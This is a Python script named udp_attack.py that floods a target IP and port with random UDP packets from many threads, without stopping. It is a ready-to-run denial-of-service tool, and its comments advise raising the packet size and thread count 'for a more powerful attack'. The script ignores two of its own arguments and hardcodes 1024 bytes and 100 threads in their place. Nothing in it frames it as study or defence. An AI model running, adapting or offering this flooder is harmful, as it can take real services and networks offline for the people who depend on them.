import sys
import socket
import threading
import time
import random

def udp_attack(target_ip, target_port, packet_size, num_threads):
    def send_packets():
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(packet_size)

        while True:
            try:
                client.sendto(bytes, (target_ip, int(target_port)))
            except Exception as e:
                print(f"Error: {e}")
            # Reduce sleep time to increase packet sending rate
            time.sleep(0.0001)  

    threads = []
    for _ in range(int(num_threads)):
        thread = threading.Thread(target=send_packets)
        thread.start()
        threads.append(thread)

    while True:
        time.sleep(1)  # Keep the main thread alive

if __name__ == '__main__':
    if len(sys.argv)!= 5:
        print("Usage: python udp_attack.py <target_ip> <target_port> <packet_size> <num_threads>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    packet_size = int(sys.argv[3])
    num_threads = int(sys.argv[4])

    # Increase packet size and number of threads for a more powerful attack
    udp_attack(target_ip, target_port, 1024, 100)